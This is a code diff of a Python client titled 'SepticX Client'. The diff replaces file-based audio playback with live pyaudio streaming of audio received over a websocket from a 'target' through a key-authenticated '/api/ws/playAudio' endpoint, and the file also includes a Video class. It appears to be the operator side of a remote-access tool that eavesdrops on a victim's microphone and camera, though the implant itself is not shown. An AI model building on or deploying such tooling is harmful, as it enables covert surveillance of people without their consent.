@@ -1,4 +1,4 @@
-import multiprocessing, threading, websocket, requests, asyncio, base64, json, time, glob, cv2, ssl, os, io
+import multiprocessing, threading, websocket, requests, asyncio, pyaudio, base64, json, time, glob, cv2, ssl, os, io
 from websocket import create_connection
 from playsound import playsound
 from PIL import Image, ImageTk
@@ -163,72 +163,33 @@ class Main:
             self.host = host
             self.Stop = False
             self.target = target
-            if os.path.exists("/sounds"):
-                for f in glob.glob('/sounds'):
-                    try:
-                        os.remove(f)
-                    except Exception as e:
-                        print(e)
-                        continue
-            else:
-                os.mkdir("/sounds")
-            threading.Thread(target=self.display, args=(target,)).start()
-            self.play(target)
+            self.play()
 
-        def recv(self, ws):
-            self.j = json.loads(ws.recv())
+        def play(self):
+            chunk = 1024
+            FORMAT = pyaudio.paInt16
+            CHANNELS = 1
+            RATE = 8000
+            RECORD_SECONDS = 5
 
-        def play(self, target):
-            count = 0
-            l = 0
 
-            ws = create_connection(f"wss://{self.host}/api/ws/playAudio", sslopt={"cert_reqs": ssl.CERT_NONE})
-            ws.send(self.key)
-            ws.send(target)
+            p = pyaudio.PyAudio()
+
+            stream = p.open(format = FORMAT,
+                channels = CHANNELS,
+                rate = RATE,
+                input = True,
+                output = True,
+                frames_per_buffer = chunk)
             
-
-            queue = multiprocessing.JoinableQueue()
-            threading.Thread(target=self.worker,args=(queue,)).start()
-            time.sleep(2)
-
-            while not self.Stop:
-
-                filename = f"sounds/sound_{count}.wav"
-
-                try:
-                    data = base64.b64decode(j["data"])
-                    with open(filename, "wb") as file:
-                        file.write(data)
-                        file.close()
-                    queue.put(filename)
-
-                except KeyboardInterrupt:
-                    break
-                    
-                except Exception as e:
-                    print(e)
-                    ws = create_connection(f"wss://{self.host}/api/ws/playAudio", sslopt={"cert_reqs": ssl.CERT_NONE})
-                    ws.send(self.key)
-                    ws.send(target)
-
-        def worker(self, queue):
+            ws = create_connection(f"wss://{self.host}/api/ws/playAudio")
+            ws.send(self.key)
+            ws.send(self.target)
+            
             while True:
-                sound = queue.get()
-                playsound(sound)
-
-        def display(self, target):
-            window = tk.Tk()
-            window.title("SepticX Client")
-            window.geometry("300x300")
-            window.configure(background='grey')
-            window.protocol("WM_DELETE_WINDOW", self.stop)
-            panel = tk.Label(window, text="Playing audio...")
-            panel.pack(side="bottom", fill="both", expand="yes")
-            self.window = window
-            window.mainloop()
+                stream.write(base64.b64decode(ws.recv()))
 
         def stop(self):
-            self.window.destroy()
             self.Stop = True
 
     class Video:
